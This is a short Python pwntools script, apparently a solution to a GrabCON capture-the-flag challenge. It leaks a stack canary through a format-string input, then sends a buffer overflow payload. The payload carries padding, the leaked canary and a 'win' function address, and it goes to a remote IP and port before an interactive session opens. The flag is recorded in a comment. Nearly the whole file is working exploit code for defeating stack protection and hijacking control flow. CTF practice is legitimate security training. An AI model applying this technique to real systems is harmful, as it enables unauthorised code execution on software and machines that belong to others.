from pwn import *


# to print out stack values using format string

#e = ELF("./b0f")
 
#for i in range(20):
    #io = e.process(level="error")
    #io.sendline("%%%d$lx" % i)
    ##io.recvline()
    #print("%d - %s" % (i, io.recvline().strip()))
    #io.close()

r = remote('35.246.42.94', 31337)

# canary found at line 31
r.sendlineafter('me???\n', b'%31$lx')

canary = int(r.recvline().strip().decode(),16)

padding = b'A' * 100
win_addr = 0x0804923a

payload = padding + p32(canary) + b'B'*12 + p32(win_addr)

r.sendline(payload)
r.interactive()


#flag = GrabCON{Byp4ss_can4ry_1s_fun!}
